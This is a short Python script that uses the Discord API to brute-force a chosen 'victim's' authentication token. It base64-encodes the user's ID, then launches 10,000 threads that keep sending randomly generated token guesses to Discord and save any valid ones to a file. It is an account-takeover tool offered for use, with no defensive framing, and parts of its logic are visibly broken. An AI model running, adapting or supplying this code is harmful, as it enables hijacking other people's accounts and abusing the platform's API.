import discord
import string
import requests as req
import datetime
import random
import time
import base64
from threading import Thread as thr



class MyClient(discord.Client):
  async def on_ready(self):
    userid = input(f"Please paste the victim's ID here: ")
    user = await client.fetch_user(int(userid))
    stamp = user.created_at
    timestamp = str(time.mktime(stamp.timetuple()))
    print(timestamp)
    encodedBytes = base64.b64encode(userid.encode("utf-8"))
    encodedid = str(encodedBytes, "utf-8")
    encodedBytes = base64.b64encode(timestamp.encode("utf-8"))
    encodedstamp = str(encodedBytes, "utf-8")
    for i in range(10000):
      thr(target = gen, args = (encodedid, encodedstamp)).start()

def gen(encodedid, encodedstamp):
  while True:
    second = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=6))
    end = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=27))
    token = f"{encodedid}.{second}.{end}"
    headers = {'Content-Type': 'application/json', 'authorization': token}
    url = "https://discordapp.com/api/v6/users/@me/library"
    r = req.get(url, headers=headers)
    if r.status_code == 200:
        print(f'{token}: Valid')
        f = open("tokens.txt", "a")
        f.write(userid + " - " + token + "\n")
        f.close() 
    else:
        print(f'{token}: Invalid')


client = MyClient()
client.run("", bot = False)
